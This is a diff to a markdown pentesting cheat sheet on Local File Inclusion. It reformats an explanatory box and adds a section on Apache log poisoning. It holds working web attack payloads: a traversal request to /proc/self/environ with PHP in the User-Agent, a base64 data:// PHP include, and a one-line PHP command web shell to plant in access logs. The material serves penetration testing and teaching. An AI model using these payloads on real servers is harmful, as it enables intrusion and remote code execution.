@@ -2,11 +2,15 @@
 
 ## Local File Inclusions (LFI)
 
-{% hint style="info" %}
+<details>
+
+<summary>What is LFI ?</summary>
+
 An attacker can use **Local File Inclusion** (LFI) to trick the web application into exposing or running files on the web server. An LFI attack may lead to information disclosure, remote code execution, or even XSS.
 
 Typically, LFI occurs when an application uses the **path to a file as input**. If the application treats this input as trusted, a local file may be used in the include statement.
-{% endhint %}
+
+</details>
 
 ### Check for LFI
 
@@ -92,6 +96,15 @@ http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbW
 ```
 GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
 User-Agent: <?=phpinfo(); ?>
+```
+
+### Via Apache Log Files
+
+```bash
+# /var/log/apache2/access.log
+# set inside the user agent or inside a GET parameter a php shell like :
+<?php system($_GET['cmd']); ?>
+# same for /proc/self/environ
 ```
 
 ### via SSH
